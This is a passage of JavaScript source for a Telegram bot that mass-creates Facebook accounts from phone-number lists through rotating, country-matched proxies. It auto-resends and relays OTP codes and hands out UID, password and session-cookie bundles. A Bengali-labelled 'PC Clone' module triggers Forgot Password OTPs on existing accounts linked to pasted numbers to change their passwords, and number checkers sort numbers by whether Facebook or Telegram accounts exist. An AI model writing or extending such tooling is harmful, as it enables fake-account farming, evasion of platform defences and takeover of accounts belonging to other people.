  async function startUserBatchRun(chatId, user, rawText, presetQueue) {
    const existingRun = activeRuns.get(user.id);
    if (existingRun?.running) {
      await sendMessage(
        chatId,
        `⚠️ <b>Active Run Detected</b>\nYou already have a batch running (<code>${existingRun.completed}/${existingRun.total}</code>). Stop it first.`,
        { inline_keyboard: [[btnBad('🛑 Stop Active Run', 'menu:stop'), btnNav('⬅️ Main Menu', 'menu:home')]] }
      );
      return;
    }

    const cfg = readUserConfig(user.id);
    if (!cfg.password || cfg.password.length < 6) {
      await sendMessage(
        chatId,
        `❌ <b>Default Password Required</b>\nPlease set a default password (minimum 6 characters) before running numbers.`,
        { inline_keyboard: [[btnOk('🔑 Set Password Now', 'set:pw'), btnNav('⬅️ Main Menu', 'menu:home')]] }
      );
      return;
    }

    const st = readSettings();
    const useResume = cfg.resume_mode !== false;
    const doneSet = readUserDone(user.id);
    const seen = new Set();
    const queue = [];
    let invalidCount = 0;
    let skippedDone = 0;

    if (presetQueue && presetQueue.length > 0) {
      for (const n of presetQueue) {
        if (useResume && doneSet.has(n)) {
          skippedDone += 1;
          continue;
        }
        queue.push(n);
      }
    } else {
      for (const line of rawText.split(/[\r\n,\s]+/)) {
        const trimmed = line.trim();
        if (!trimmed) continue;
        const n = normNumber(trimmed, cfg.cc);
        if (!n) {
          invalidCount += 1;
          continue;
        }
        if (seen.has(n)) continue;
        seen.add(n);
        if (useResume && doneSet.has(n)) {
          skippedDone += 1;
          continue;
        }
        queue.push(n);
      }
    }

    if (queue.length === 0) {
      await sendMessage(
        chatId,
        `⚠️ <b>No Valid New Numbers Found</b>\n❌ Invalid: <code>${invalidCount}</code>  •  ⏭ Skipped Done: <code>${skippedDone}</code>`,
        { inline_keyboard: [[btnOk('🚀 Try Again', 'menu:run'), btnNav('⬅️ Main Menu', 'menu:home')]] }
      );
      return;
    }

    const remainingQuota = Math.max(0, user.dailyLimit - user.usedToday);
    if (user.role !== 'admin' && remainingQuota <= 0) {
      await sendMessage(
        chatId,
        `⛔ <b>Daily Quota Reached</b>\nUsage: <code>${user.usedToday}/${user.dailyLimit}</code>\n\n<blockquote>Contact ${escapeHtml(st.adminUsername)} to raise your daily limit.</blockquote>`,
        { inline_keyboard: [[btnNav('⬅️ Main Menu', 'menu:home')]] }
      );
      return;
    }

    const finalQueue = user.role === 'admin' ? queue : queue.slice(0, remainingQuota);
    const runState = {
      running: true,
      total: finalQueue.length,
      completed: 0,
      okCount: 0,
      pendingCount: 0,
      failCount: 0,
      currentNumber: finalQueue[0] ?? null,
      abortRequested: false,
      startedAt: Date.now(),
    };
    activeRuns.set(user.id, runState);

    const statusRes = await sendMessage(
      chatId,
      [
        `🚀 <b>BATCH RUN STARTED</b>`,
        DIVIDER,
        `📋 <b>Queue:</b> <code>${finalQueue.length}</code> numbers (CC: <code>+${escapeHtml(cfg.cc)}</code>)`,
        `⏭ <b>Skipped Done:</b> <code>${skippedDone}</code>  •  ❌ <b>Invalid:</b> <code>${invalidCount}</code>`,
        `📊 <b>Progress:</b> <code>${renderProgressBar(0, finalQueue.length)}</code> (<code>0/${finalQueue.length}</code>)`,
      ].join('\n'),
      { inline_keyboard: [[btnBad('🛑 Stop Run', 'menu:stop')]] }
    );
    const progressMsgId = statusRes.ok && statusRes.result?.message_id ? statusRes.result.message_id : null;

    pushBotLog(`User ${user.id} started batch (${finalQueue.length} numbers)`);
    appendUserLog(user.id, `BATCH STARTED: ${finalQueue.length} numbers (cc=+${cfg.cc})`);

    (async () => {
      const userProxies = readUserProxies(user.id);
      const proxyPool = userProxies.length > 0 ? userProxies : st.shareGlobalProxies ? readGlobalProxies() : [];
      const userBaseCookie = readUserCookies(user.id);
      const failureDetails = [];
      const badProxies = new Set();
      const threads = Math.max(1, Math.min(8, Number(cfg.threads ?? 3)));
      const delaySecBase = Math.max(0, Number(cfg.delay ?? 2));
      let nextIdx = 0;
      let lastProgEditAt = 0;

      const updateProgress = async (statusLine = '', force = false) => {
        if (!progressMsgId) return;
        const now = Date.now();
        if (!force && now - lastProgEditAt < 2500) return;
        lastProgEditAt = now;
        await editMessage(
          chatId,
          progressMsgId,
          [
            `⚡ <b>BATCH PROGRESS (${threads}x TURBO)</b>`,
            DIVIDER,
            statusLine || `📱 <b>Active:</b> <code>+${escapeHtml(runState.currentNumber || '-')}</code>`,
            `🚀 <b>Engine:</b> <code>${escapeHtml((cfg.engine_mode || 'hybrid').toUpperCase())}</code>  •  🔍 <b>GQL:</b> ${cfg.precheck_gql !== false ? 'ON' : 'OFF'}  •  ♻️ <b>Auto-IP:</b> ${cfg.auto_proxy_refresh !== false ? 'ON' : 'OFF'}`,
            `📊 <b>Progress:</b> <code>${renderProgressBar(runState.completed, finalQueue.length)}</code> (<code>${runState.completed}/${finalQueue.length}</code>)`,
            `✅ Ready: <code>${runState.okCount}</code>  •  🔐 OTP: <code>${runState.pendingCount}</code>  •  ❌ Fail: <code>${runState.failCount}</code>`,
          ].join('\n'),
          { inline_keyboard: [[btnBad('🛑 Stop Run', 'menu:stop')]] },
          { throttle: true, noRetry: true, minIntervalMs: force ? 1200 : 2500 }
        );
      };

      const worker = async () => {
        while (!runState.abortRequested) {
          const i = nextIdx++;
          if (i >= finalQueue.length) break;
          const phone = finalQueue[i];
          if (!phone) continue;
          runState.currentNumber = phone;
          const numDet = detectCountryFromNumber(`+${phone}`, cfg.cc);
          const numIso = (cfg.auto_proxy_country !== false && numDet?.iso && numDet.iso !== '??')
            ? numDet.iso
            : getCountryInfo(cfg.cc)[1];
          const numCName = numDet?.name || getCountryInfo(cfg.cc)[0];
          const healthyPool = proxyPool.filter((p) => !badProxies.has(p) && !badProxies.has(proxyHealthKey(p)));
          const activePool = healthyPool.length > 0 ? healthyPool : proxyPool;
          const px = selectSmartProxy(activePool, i, badProxies, cfg.proxy_mode || 'rotate', cfg.proxy || null, numIso);
          const pxPreview = adaptProxyForSession(px, {
            iso: numIso,
            autoCountry: cfg.auto_proxy_country !== false,
            refreshSession: cfg.auto_proxy_refresh !== false,
          });
          const pxHost = px ? (() => { try { return new URL(px).hostname; } catch { return 'proxy'; } })() : 'Direct IP';
          const pxHealth = px ? proxyHealth.get(proxyHealthKey(px)) : null;
          const routeDesc = px
            ? `Proxy (${escapeHtml(pxHost)} • <b>${escapeHtml(pxPreview.isoApplied || numIso)}</b>${pxPreview.sessionId ? ` • <code>ssid:${escapeHtml(pxPreview.sessionId.slice(0, 6))}</code>` : ''}${pxHealth?.exitIp ? ` → ${escapeHtml(pxHealth.exitIp)}` : ''})`
            : 'Direct IP';

          await updateProgress(
            `⏳ <b>Working on:</b> <code>+${escapeHtml(phone)}</code> [${escapeHtml(numCName)} • <b>${escapeHtml(numIso)}</b>] (<code>${i + 1}/${finalQueue.length}</code>)\n🌐 <b>Route:</b> ${routeDesc} • 🛡 Strict: ${cfg.strict_proxy !== false ? 'ON' : 'OFF'}`,
            i === 0
          );

          const res = await runNodeAttempt(phone, cfg.password, cfg, px, {
            baseCookiesRaw: userBaseCookie,
            shouldAbort: () => runState.abortRequested,
            proxiesPool: activePool,
            badProxies,
            countryHint: numCName,
            onDebug: (msg) => appendUserLog(user.id, msg),
          });

          if (res.debugHtml) saveUserDebugHtml(user.id, res.debugHtml);

          markUserDone(user.id, phone);
          runState.completed += 1;

          const resCountryName = res.countryName || numCName;
          const resCountryIso = res.countryIso || numIso;
          const resProxyIso = res.proxyIso || resCountryIso;

          if (res.status === 'OK') {
            const usersMap = readUsersMap();
            const uRec = usersMap[user.id];
            if (uRec) {
              uRec.usedToday += 1;
              uRec.totalOk += 1;
              uRec.lastActiveAt = Date.now();
              writeUsersMap(usersMap);
            }
            runState.okCount += 1;
            storeUserAccount(user.id, {
              name: res.name,
              phone,
              pass: cfg.password,
              uid: res.uid,
              status: 'OK',
              confirmed: true,
              printer: res.printer,
              engine: res.engine,
              cookies: res.cookies,
            });
            const cstr = formatCookieHeader(res.cookies || {});
            await sendMessage(
              chatId,
              [
                `✅ <b>ACCOUNT READY</b>`,
                DIVIDER,
                `👤 <b>Profile:</b> ${escapeHtml(res.name)} [${escapeHtml(resCountryName)} • <b>${escapeHtml(resCountryIso)}</b>]`,
                `📱 <b>Number:</b> <code>+${escapeHtml(phone)}</code>`,
                `🔑 <b>UID|Pass:</b> <code>${escapeHtml(res.uid)}|${escapeHtml(cfg.password)}</code>`,
                `🌐 <b>Proxy Route:</b> <code>${escapeHtml(resProxyIso)}</code>  •  ⚙️ <code>${escapeHtml(res.engine || 'limited')}</code>`,
                ``,
                `<blockquote>🍪 <code>${escapeHtml(cstr.slice(0, 260))}${cstr.length > 260 ? '...' : ''}</code></blockquote>`,
              ].join('\n'),
              {
                inline_keyboard: [
                  [
                    btnOk('📤 OTP Send (PC Proxy)', `otp:pc_send:${phone}`),
                    btnNav('📡 Lamix OTP চেক', `otp:check_lamix:${phone}`),
                  ],
                  [
                    btnOk('📦 View Accounts', 'menu:accounts'),
                    btnNav('⬅️ Main Menu', 'menu:home'),
                  ],
                ],
              }
            );
          } else if (res.status === 'CONFIRM' || res.status === 'CHECKPOINT') {
            let finalItem = res.pendingPayload || null;
            const configuredResends = Math.max(0, Math.min(3, Number(cfg.auto_otp_resend ?? 2)));
            let autoResendRes = null;

            if (finalItem) {
              upsertUserPending(user.id, finalItem);
              if (configuredResends > 0 && !runState.abortRequested) {
                autoResendRes = await performAutoOtpResends(finalItem, cfg, userBaseCookie, {
                  rounds: configuredResends,
                  shouldAbort: () => runState.abortRequested,
                  onStep: async (round, totalRounds, stepRes, curItem) => {
                    finalItem = curItem;
                    if (stepRes.ok && !stepRes.alreadyConfirmed) {
                      upsertUserPending(user.id, curItem);
                      appendUserLog(user.id, `+${phone} [${resCountryIso}] Auto OTP Resent (${round}/${totalRounds}) via ${stepRes.via}`);
                      await updateProgress(
                        `🔁 <b>Auto-Resending OTP (${round}/${totalRounds}):</b> <code>+${escapeHtml(phone)}</code> [${escapeHtml(resCountryName)} • <b>${escapeHtml(resCountryIso)}</b>]`,
                        false
                      );
                    } else if (!stepRes.ok) {
                      appendUserLog(user.id, `+${phone} [${resCountryIso}] Auto OTP Resend ${round}/${totalRounds}: ${stepRes.reason || 'stopped'}`);
                    }
                  },
                });
                if (autoResendRes?.item) finalItem = autoResendRes.item;
              }
            }

            if (autoResendRes?.alreadyConfirmed) {
              const curPend = readUserPending(user.id).filter((p) => p.phone !== phone);
              writeUserPending(user.id, curPend);
              const usersMap = readUsersMap();
              const uRec = usersMap[user.id];
              if (uRec) {
                uRec.usedToday += 1;
                uRec.totalOk += 1;
                uRec.lastActiveAt = Date.now();
                writeUsersMap(usersMap);
              }
              runState.okCount += 1;
              storeUserAccount(user.id, {
                name: res.name,
                phone,
                pass: cfg.password,
                uid: autoResendRes.uid,
                status: 'OK',
                confirmed: true,
                printer: res.printer,
                engine: `${res.engine || 'limited'}+auto-resend`,
                cookies: autoResendRes.cookies,
              });
              const cstr = formatCookieHeader(autoResendRes.cookies || {});
              await sendMessage(
                chatId,
                [
                  `✅ <b>ACCOUNT READY (AUTO-CONFIRMED)</b>`,
                  DIVIDER,
                  `👤 <b>Profile:</b> ${escapeHtml(res.name)} [${escapeHtml(resCountryName)} • <b>${escapeHtml(resCountryIso)}</b>]`,
                  `📱 <b>Number:</b> <code>+${escapeHtml(phone)}</code>`,
                  `🔑 <b>UID|Pass:</b> <code>${escapeHtml(autoResendRes.uid)}|${escapeHtml(cfg.password)}</code>`,
                  ``,
                  `<blockquote>🍪 <code>${escapeHtml(cstr.slice(0, 260))}${cstr.length > 260 ? '...' : ''}</code></blockquote>`,
                ].join('\n'),
                {
                  inline_keyboard: [
                    [
                      btnOk('📤 OTP Send (PC Proxy)', `otp:pc_send:${phone}`),
                      btnNav('📡 Lamix OTP চেক', `otp:check_lamix:${phone}`),
                    ],
                    [
                      btnOk('📦 View Accounts', 'menu:accounts'),
                      btnNav('⬅️ Main Menu', 'menu:home'),
                    ],
                  ],
                }
              );
            } else {
              if (finalItem) upsertUserPending(user.id, finalItem);
              const usersMap = readUsersMap();
              const uRec = usersMap[user.id];
              if (uRec) {
                uRec.usedToday += 1;
                uRec.totalPending += 1;
                uRec.lastActiveAt = Date.now();
                writeUsersMap(usersMap);
              }
              runState.pendingCount += 1;
              storeUserAccount(user.id, {
                name: res.name,
                phone,
                pass: cfg.password,
                status: res.status,
                confirmed: false,
                printer: res.printer,
                engine: res.engine,
                cookies: finalItem?.cookies || res.cookies,
              });
              const resendDone = Number(finalItem?.resendCount || autoResendRes?.count || 0);
              const stickyHost = finalItem?.proxy
                ? (() => { try { return new URL(finalItem.proxy).hostname; } catch { return 'proxy'; } })()
                : 'Direct';
              await sendMessage(
                chatId,
                [
                  `🔔 <b>OTP / CHECKPOINT REQUIRED</b>`,
                  DIVIDER,
                  `📱 <b>Number:</b> <code>+${escapeHtml(phone)}</code>`,
                  `🌍 <b>Country:</b> ${escapeHtml(resCountryName)} [<b>${escapeHtml(resCountryIso)}</b>]  •  📌 <b>${escapeHtml(res.status)}</b>`,
                  `🌐 <b>Sticky Proxy:</b> <code>${escapeHtml(stickyHost)}</code> (${escapeHtml(resProxyIso)})  •  🔁 <b>OTP Resent:</b> <code>${resendDone}/${configuredResends}</code>`,
                  `👤 <b>Profile:</b> ${escapeHtml(res.name)}  •  🔑 <b>Pass:</b> <code>${escapeHtml(cfg.password)}</code>`,
                ].join('\n'),
                {
                  inline_keyboard: [
                    [
                      btnOk(`🔑 Enter OTP (+${phone.slice(-6)})`, `otp:enter:${phone}`),
                      btnOk(`📤 OTP Send (PC Proxy)`, `otp:pc_send:${phone}`),
                    ],
                    [
                      btnNav(`📡 Lamix OTP চেক`, `otp:check_lamix:${phone}`),
                      btnNav(`🔁 Resend OTP`, `otp:resend:${phone}`),
                    ],
                    [
                      btnNav(`🔎 Check Login`, `otp:check:${phone}`),
                      btnNav('🔐 OTP Queue', 'menu:otp'),
                      btnBad('🗑 Delete', `otp:del:${phone}`),
                    ],
                  ],
                }
              );
            }
          } else {
            const usersMap = readUsersMap();
            const uRec = usersMap[user.id];
            if (uRec) {
              uRec.usedToday += 1;
              uRec.totalFail += 1;
              uRec.lastActiveAt = Date.now();
              writeUsersMap(usersMap);
            }
            runState.failCount += 1;
            storeUserAccount(user.id, {
              name: res.name,
              phone,
              pass: cfg.password,
              status: res.status,
              confirmed: false,
              printer: res.printer,
              engine: res.engine,
              cookies: res.cookies,
              err: res.err,
            });
            const reason = `${res.status}: ${res.err || 'unknown'}`;
            failureDetails.push(`+${phone} [${resCountryIso}] → ${reason}`);
            if (finalQueue.length <= 5) {
              await sendMessage(
                chatId,
                [
                  `❌ <b>ATTEMPT FAILED [${escapeHtml(res.status)}]</b>`,
                  DIVIDER,
                  `📱 <b>Number:</b> <code>+${escapeHtml(phone)}</code> [${escapeHtml(resCountryName)} • <b>${escapeHtml(resCountryIso)}</b>]`,
                  `<blockquote>💬 ${escapeHtml(res.err || 'unknown')}</blockquote>`,
                ].join('\n')
              );
            }
          }

          await updateProgress(`📱 <b>Last Finished:</b> <code>+${escapeHtml(phone)}</code>`);

          if (nextIdx < finalQueue.length && !runState.abortRequested && delaySecBase > 0) {
            let delaySec = delaySecBase;
            const isBatchBreak = cfg.batch > 0 && (i + 1) % cfg.batch === 0;
            if (isBatchBreak) delaySec *= 2;
            const endAt = Date.now() + delaySec * 1000;
            while (Date.now() < endAt && !runState.abortRequested) {
              await new Promise((r) => setTimeout(r, 150));
            }
          }
        }
      };

      const workerCount = Math.min(threads, finalQueue.length);
      await Promise.all(Array.from({ length: workerCount }, () => worker()));

      runState.running = false;
      runState.currentNumber = null;
      pushBotLog(`User ${user.id} finished batch: OK=${runState.okCount}, OTP=${runState.pendingCount}, FAIL=${runState.failCount}`);
      appendUserLog(user.id, `BATCH FINISHED: OK=${runState.okCount}, OTP=${runState.pendingCount}, FAIL=${runState.failCount}`);

      const errPreview =
        failureDetails.length > 0 && finalQueue.length > 5
          ? `\n\n<b>Recent Failure Reasons:</b>\n<blockquote><code>${escapeHtml(failureDetails.slice(-6).join('\n'))}</code></blockquote>`
          : '';

      const summaryTxt = [
        runState.abortRequested ? `🛑 <b>BATCH STOPPED</b>` : `🏁 <b>BATCH COMPLETED</b>`,
        DIVIDER,
        `📊 <b>Processed:</b> <code>${renderProgressBar(runState.completed, runState.total)}</code> (<code>${runState.completed}/${runState.total}</code>)`,
        `✅ <b>Ready Accounts:</b> <code>${runState.okCount}</code>`,
        `🔐 <b>Pending OTP:</b> <code>${runState.pendingCount}</code>`,
        `❌ <b>Failed/Other:</b> <code>${runState.failCount}</code>${errPreview}`,
      ].join('\n');
      if (progressMsgId) {
        await editMessage(chatId, progressMsgId, summaryTxt, {
          inline_keyboard: [
            [
              btnNav('🔐 OTP Queue', 'menu:otp'),
              btnOk('📦 Accounts', 'menu:accounts'),
              btnNav('📜 Logs', 'menu:logs'),
            ],
            [btnNav('⬅️ Main Menu', 'menu:home')],
          ],
        });
      }
    })();
  }

  async function handleOtpReply(chatId, uid, phone, code) {
    const items = readUserPending(uid);
    const idx = items.findIndex((p) => p.phone === phone);
    if (idx === -1) {
      promptSessions.delete(uid);
      await sendMessage(chatId, `⚠️ Session for <code>+${escapeHtml(phone)}</code> is no longer in queue.`, {
        inline_keyboard: [[btnNav('🔐 OTP Queue', 'menu:otp'), btnNav('⬅️ Main Menu', 'menu:home')]],
      });
      return;
    }

    const item = { ...items[idx] };
    const cfg = readUserConfig(uid);
    const userCookie = readUserCookies(uid);
    await sendMessage(chatId, `⏳ Submitting code for <code>+${escapeHtml(phone)}</code>...`);

    const result = item.flow === 'recovery'
      ? await submitRecoveryOtpAndLogin(item, code.trim(), item.pass || cfg.password, cfg)
      : await performOtpConfirm(item, code.trim(), cfg, userCookie);
    if (result.status === 'OK') {
      promptSessions.delete(uid);
      const finalPass = result.pass || item.pass || cfg.password || '';
      storeUserAccount(uid, {
        name: item.name,
        phone: item.phone,
        pass: finalPass,
        uid: result.uid,
        status: 'OK',
        confirmed: true,
        engine: item.flow === 'recovery' ? 'PC_CLONE_RECOVERY' : undefined,
        cookies: result.cookies,
      });
      items.splice(idx, 1);
      writeUserPending(uid, items);
      const usersMap = readUsersMap();
      if (usersMap[uid]) {
        usersMap[uid].totalOk += 1;
        writeUsersMap(usersMap);
      }
      pushBotLog(`User ${uid} verified OTP for +${phone} -> UID ${result.uid}`);
      appendUserLog(uid, `OTP VERIFIED +${phone} -> UID ${result.uid}`);
      const cstr = formatCookieHeader(result.cookies || {});
      await sendMessage(
        chatId,
        [
          `✅ <b>OTP VERIFIED &amp; LOGGED IN!</b>`,
          DIVIDER,
          `📱 <b>Number:</b> <code>+${escapeHtml(item.phone)}</code>`,
          `🆔 <b>UID:</b> <code>${escapeHtml(result.uid)}</code>  •  🔑 <b>Pass:</b> <code>${escapeHtml(finalPass)}</code>`,
          `📋 <b>UID|Pass|Cookies:</b>`,
          `<blockquote><code>${escapeHtml(result.uid)}|${escapeHtml(finalPass)}|${escapeHtml(cstr.slice(0, 400))}${cstr.length > 400 ? '...' : ''}</code></blockquote>`,
        ].join('\n'),
        {
          inline_keyboard: [
            [
              btnOk('🔐 Remaining OTPs', 'menu:otp'),
              btnNav('📦 Accounts Vault', 'menu:accounts'),
            ],
            [btnNav('⬅️ Main Menu', 'menu:home')],
          ],
        }
      );
      return;
    }

    if (result.status === 'RETRY') {
      items[idx] = result.item;
      writeUserPending(uid, items);
      appendUserLog(uid, `OTP RETRY step +${phone} (${result.item.confirm_url || ''})`);
      await sendMessage(
        chatId,
        [
          `🔄 <b>NEXT STEP REQUIRED</b>`,
          DIVIDER,
          `📱 <b>Number:</b> <code>+${escapeHtml(phone)}</code>`,
          `🔗 <b>URL:</b> <code>${escapeHtml(result.item.confirm_url || '')}</code>`,
          ``,
          `<blockquote>Reply with the next code or checkpoint response:</blockquote>`,
        ].join('\n'),
        { inline_keyboard: [[btnBad('❌ Cancel OTP Input', 'menu:otp')]] }
      );
      return;
    }

    if (result.status === 'WRONG') {
      appendUserLog(uid, `OTP WRONG +${phone}`);
      await sendMessage(
        chatId,
        `❌ <b>Incorrect or Expired OTP</b> for <code>+${escapeHtml(phone)}</code>.\nReply again with the right code:`,
        { inline_keyboard: [[btnBad('❌ Cancel', 'menu:otp')]] }
      );
      return;
    }

    promptSessions.delete(uid);
    appendUserLog(uid, `OTP FAIL +${phone}: ${result.err}`);
    await sendMessage(
      chatId,
      `❌ <b>Verification Failed</b> for <code>+${escapeHtml(phone)}</code>\n<blockquote>${escapeHtml(result.err)}</blockquote>`,
      { inline_keyboard: [[btnNav('🔐 Back to OTP Queue', 'menu:otp'), btnNav('⬅️ Main Menu', 'menu:home')]] }
    );
  }

  async function handleNormalizeText(chatId, uid, rawText) {
    const cfg = readUserConfig(uid);
    const doneSet = readUserDone(uid);
    const seen = new Set();
    const valid = [];
    const invalid = [];
    const skipped = [];

    for (const line of rawText.split(/[\r\n,\s]+/)) {
      const trimmed = line.trim();
      if (!trimmed) continue;
      const n = normNumber(trimmed, cfg.cc);
      if (!n) {
        invalid.push(trimmed);
        continue;
      }
      if (seen.has(n)) continue;
      seen.add(n);
      if (doneSet.has(n)) skipped.push(n);
      valid.push(n);
    }

    normalizedCache.set(uid, valid);
    normalizedFreeCache.delete(uid);
    const isoCounts = {};
    for (const n of valid) {
      const det = detectCountryFromNumber(`+${n}`, cfg.cc);
      const tag = det?.iso && det.iso !== '??' ? det.iso : 'AUTO';
      isoCounts[tag] = (isoCounts[tag] || 0) + 1;
    }
    const isoSummary = Object.entries(isoCounts).map(([k, v]) => `${k}:${v}`).join(' • ');
    const preview = valid
      .slice(0, 12)
      .map((n) => {
        const det = detectCountryFromNumber(`+${n}`, cfg.cc);
        return `+${n} [${det?.iso || '??'}]`;
      })
      .join('\n');
    await sendMessage(
      chatId,
      [
        `🔢 <b>NUMBER NORMALIZER RESULT (Fallback CC: +${escapeHtml(cfg.cc)})</b>`,
        DIVIDER,
        `✅ <b>Valid Unique:</b> <code>${valid.length}</code>${isoSummary ? ` (${escapeHtml(isoSummary)})` : ''}`,
        `⚠️ <b>Already in Done:</b> <code>${skipped.length}</code>`,
        `❌ <b>Invalid Skipped:</b> <code>${invalid.length}</code>`,
        preview ? `\n<b>Preview:</b>\n<blockquote><code>${escapeHtml(preview)}</code>${valid.length > 12 ? `\n... +${valid.length - 12} more` : ''}</blockquote>` : '',
      ].filter(Boolean).join('\n'),
      {
        inline_keyboard: [
          ...(valid.length > 0
            ? [
                [
                  btnOk(`▶️ Start Batch (${valid.length})`, 'norm:run_cached'),
                  btnNav(`🔍 GQL Check (${Math.min(valid.length, 1000)})`, 'norm:gqlcheck'),
                ],
              ]
            : []),
          [
            btnNav('🔢 Check More', 'menu:normalize'),
            btnNav('⬅️ Main Menu', 'menu:home'),
          ],
        ],
      }
    );
  }

  async function renderNumberCheckMenu(chatId, uid, editMsgId) {
    const st = readSettings();
    const text = [
      `🔍 <b>${escapeHtml(st.brandName || DEFAULT_BRAND_NAME)} • নাম্বার চেকার হাব</b>`,
      DIVIDER,
      `এখানে ১ ক্লিকেই নাম্বারে অ্যাকাউন্ট খোলা যাবে নাকি তা চেক করা যাবে:`,
      ``,
      `1️⃣ <b>📘 FB নাম্বার চেক:</b>`,
      `   • নাম্বারে আগে থেকে ফেসবুক আছে (Taken) নাকি নতুন খোলা যাবে (Fresh) তা বের করে।`,
      `   • Fresh ও Taken নাম্বার আলাদা <code>.txt</code> ফাইলে ডাউনলোড দেয়।`,
      ``,
      `2️⃣ <b>✈️ TG নাম্বার চেক:</b>`,
      `   • নাম্বারে টেলিগ্রাম অ্যাকাউন্ট খোলা আছে কিনা দ্রুত যাচাই করে।`,
      `   • Registered ও Unregistered নাম্বার আলাদা ফাইলে দেয়।`,
      ``,
      `📌 <i>কোন প্ল্যাটফর্মের নাম্বার চেক করবেন তা নিচে বাছুন:</i>`,
    ].join('\n');
    const kb = {
      inline_keyboard: [
        [
          btnOk('📘 FB নাম্বার চেক', 'menu:normalize'),
          btnOk('✈️ TG নাম্বার চেক', 'menu:tg_check'),
        ],
        [
          btnNav('⬅️ মেইন মেনু', 'menu:home'),
        ],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, text, kb);
    else await sendMessage(chatId, text, kb);
  }

  async function renderPcCloneMenu(chatId, uid, editMsgId) {
    const st = readSettings();
    const cfg = readUserConfig(uid);
    const lamixTok = resolveFbToolsLamixToken();
    const hasActivePanels = readPanelsStore().panels.some((p) => p.active !== false);
    const userProxies = readUserProxies(uid);
    const proxyPool = userProxies.length > 0 ? userProxies : st.shareGlobalProxies ? readGlobalProxies() : [];
    const pendingList = readUserPending(uid);
    const lastBatch = pcBatchState.get(uid);
    const resends = Math.max(1, Math.min(12, Number(cfg.pc_otp_resends ?? 3)));
    const links = normalizePcRecoveryUrls(cfg.pc_recovery_urls, { fallbackToDefaults: true });
    const recPw = cfg.password ? `🟢 <code>${escapeHtml(cfg.password)}</code>` : '🟡 অটো পাসওয়ার্ড (<code>FbClone@xxxx</code>)';
    promptSessions.set(uid, { kind: 'awaiting_pc_clone' });
    const linkLines = links.map((u, idx) => `   ${idx + 1}. <code>${escapeHtml(u)}</code>`).join('\n');
    const txt = [
      `💻 <b>PC CLONE • ওয়েব রিকভারি ইঞ্জিন (PRO)</b>`,
      DIVIDER,
      `পুরনো FB অ্যাকাউন্ট রিকভারি OTP পাঠিয়ে পাসওয়ার্ড বদলাতে নিচে নাম্বার দিন:`,
      `🌐 <b>প্রক্সি পুল:</b> <code>${proxyPool.length}</code> টি (${cfg.auto_proxy_country !== false ? '🟢 অটো দেশ ম্যাচ' : '🔵 সাধারণ'})`,
      `🗑 <b>নন-FB ফ্রি নাম্বার:</b> 🟢 অটো বাদ দেবে`,
      `🔁 <b>OTP পাঠানোর সংখ্যা:</b> <code>1–${resends}x</code> (লাইভ রিসেন্ট বাটন সহ)`,
      `📡 <b>অটো OTP সার্ভার:</b> ${(lamixTok || hasActivePanels) ? '🟢 চালু (Auto Poll + Login)' : '⚪ ম্যানুয়াল/কিউ মোড'}`,
      `🔐 <b>অ্যাক্টিভ OTP কিউ:</b> <code>${pendingList.length}</code> টি নাম্বার`,
      `🔑 <b>রিকভারি পাসওয়ার্ড:</b> ${recPw}`,
      `🔗 <b>অ্যাক্টিভ রিকভারি লিংক (${links.length}টি):</b>\n${linkLines}`,
      ``,
      `<blockquote>📥 নিচে নাম্বারগুলো পেস্ট করুন (প্রতি লাইনে ১টি) অথবা <code>.txt</code> ফাইল পাঠান!</blockquote>`,
    ].join('\n');
    const extraRow = [];
    if (pendingList.length > 0) extraRow.push(btnOk(`🔁 সব OTP রিসেন্ট (${pendingList.length})`, 'pc:resend_all'));
    if (lastBatch?.failedNumbers?.length > 0) extraRow.push(btnBad(`🔄 ফেইলড রিট্রাই (${lastBatch.failedNumbers.length})`, 'pc:retry_failed'));
    const kb = {
      inline_keyboard: [
        [
          btnOk(`🔗 রিকভারি লিংক (${links.length})`, 'pc:links'),
          btnOk(`🔁 OTP সংখ্যা (${resends}x)`, 'pc:set_resends'),
        ],
        ...(extraRow.length > 0 ? [extraRow] : []),
        [
          btnNav(`🌐 প্রক্সি (${proxyPool.length})`, 'menu:proxies'),
          btnNav(`🔐 OTP কিউ (${pendingList.length})`, 'menu:otp'),
        ],
        [
          btnOk('📡 সার্ভার OTP আনুন', 'otp:lamix_sync'),
          btnNav('🔒 পাসওয়ার্ড সেট', 'set:pw'),
        ],
        [
          btnBad('🧼 ১-ক্লিক ফ্রেশ কুকি', 'cookies:fresh_all'),
          btnNav('⬅️ মেইন মেনু', 'menu:home'),
        ],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderPcCloneLinksMenu(chatId, uid, editMsgId) {
    const cfg = readUserConfig(uid);
    const active = normalizePcRecoveryUrls(cfg.pc_recovery_urls, { fallbackToDefaults: true });
    const isSelected = (u) => active.includes(u);
    const presetRowBtns = PC_RECOVERY_PRESETS.map((p) =>
      (isSelected(p.url) ? btnOk(`✅ ${p.label}`, `pc:links_toggle:${p.id}`) : btnNav(`➕ ${p.label}`, `pc:links_toggle:${p.id}`))
    );
    const linkLines = active.map((u, idx) => `${idx + 1}. <code>${escapeHtml(u)}</code>`).join('\n');
    const txt = [
      `🔗 <b>PC CLONE FACEBOOK RECOVERY LINKS</b>`,
      DIVIDER,
      `Bot uses these links in order with your sticky country proxy to send Forgot Password OTP &amp; check OTP server after every round:`,
      ``,
      linkLines,
      ``,
      `<blockquote>Tap any preset below to toggle, or tap <b>Suggest Custom Links</b> to paste one/multiple Facebook URLs.</blockquote>`,
    ].join('\n');
    const kb = {
      inline_keyboard: [
        presetRowBtns.slice(0, 2),
        presetRowBtns.slice(2, 4),
        [presetRowBtns[4], btnOk('📝 Suggest Custom Links', 'pc:links_custom')],
        [btnNav('♻️ Reset Defaults', 'pc:links_reset'), btnNav('⬅️ Back to PC Clone', 'menu:pc_clone')],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function runPcCloneBatch(chatId, uid, numbersInput) {
    const st = readSettings();
    const cfg = readUserConfig(uid);
    const existing = activeRuns.get(uid);
    if (existing?.running) {
      await sendMessage(chatId, '⏳ A batch job is already running for your account. Wait or stop it first.', {
        inline_keyboard: [[btnBad('🛑 Stop Active Run', 'menu:stop')]],
      });
      return;
    }

    const userProxies = readUserProxies(uid);
    const proxyPool = userProxies.length > 0 ? userProxies : st.shareGlobalProxies ? readGlobalProxies() : [];
    const targetList = numbersInput.slice(0, 500);
    if (targetList.length === 0) {
